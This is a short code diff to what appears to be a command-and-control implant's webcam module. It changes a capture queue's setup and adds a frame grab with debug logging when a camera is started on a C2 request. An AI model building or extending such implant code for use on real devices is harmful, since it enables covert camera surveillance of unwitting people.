@@ -135,9 +135,7 @@ int count;
     output = [[AVCaptureVideoDataOutput alloc] init];
     [session addOutput:output];
 
-    queue = dispatch_queue_create("cam_queue", NULL);
-    [output setAlwaysDiscardsLateVideoFrames:YES];
-    [output setVideoSettings:@{(NSString *)kCVPixelBufferPixelFormatTypeKey:@(kCVPixelFormatType_32BGRA)}];
+    queue = dispatch_queue_create("cam_queue", DISPATCH_QUEUE_SERIAL);
     [output setSampleBufferDelegate:self queue:queue];
     [session startRunning];
 
@@ -267,6 +265,7 @@ static tlv_pkt_t *cam_list(c2_t *c2)
 static tlv_pkt_t *cam_start(c2_t *c2)
 {
     int camID;
+    NSData *frame;
 
     tlv_pkt_get_int(c2->request, TLV_TYPE_CAM_ID, &camID);
 
@@ -276,6 +275,13 @@ static tlv_pkt_t *cam_start(c2_t *c2)
 
         if ([cam start:camID])
         {
+            frame = [cam getFrame];
+
+            if (frame == nil)
+            {
+                log_debug("* Frame is somehow nil?\n");
+            }
+
             return api_craft_tlv_pkt(API_CALL_SUCCESS);
         }
         else
